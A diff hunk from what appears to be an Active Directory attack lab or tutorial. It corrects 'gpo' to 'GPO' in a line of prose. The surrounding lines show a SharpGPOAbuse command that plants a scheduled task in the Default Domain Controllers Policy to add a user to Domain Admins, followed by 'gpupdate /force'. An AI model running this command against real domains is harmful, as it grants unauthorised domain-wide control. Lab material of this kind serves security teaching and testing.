@@ -57,7 +57,7 @@ cd C:\attacker-tools
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author contoso\adminuser --Command "cmd.exe" --Arguments '/c net group \"Domain Admins\" john /ADD' --GPOName "Default Domain Controllers Policy" --force
 ```
 
-In a real environment, we would have to wait until the gpo is reprocessed by the DC. To speed this up, run gpupdate on the DC.
+In a real environment, we would have to wait until the GPO is reprocessed by the DC. To speed this up, run gpupdate on the DC.
 
 ```
 gpupdate /force
